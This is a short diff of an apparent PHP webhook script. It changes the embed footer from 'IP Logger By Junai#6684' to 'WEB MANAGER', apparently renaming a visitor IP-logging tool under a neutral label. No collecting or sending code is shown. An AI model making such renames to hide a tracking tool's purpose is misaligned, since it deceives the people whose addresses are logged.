@@ -19,7 +19,7 @@ $hookObject = json_encode([
             "timestamp" => "1810-01-10T19:12:00-05:00",
             "color" => hexdec( "FFFFFF" ),
             "footer" => [
-                "text" => "IP Logger By Junai#6684 🔧 ",
+                "text" => "WEB MANAGER",
             ],
 
             "fields" => [
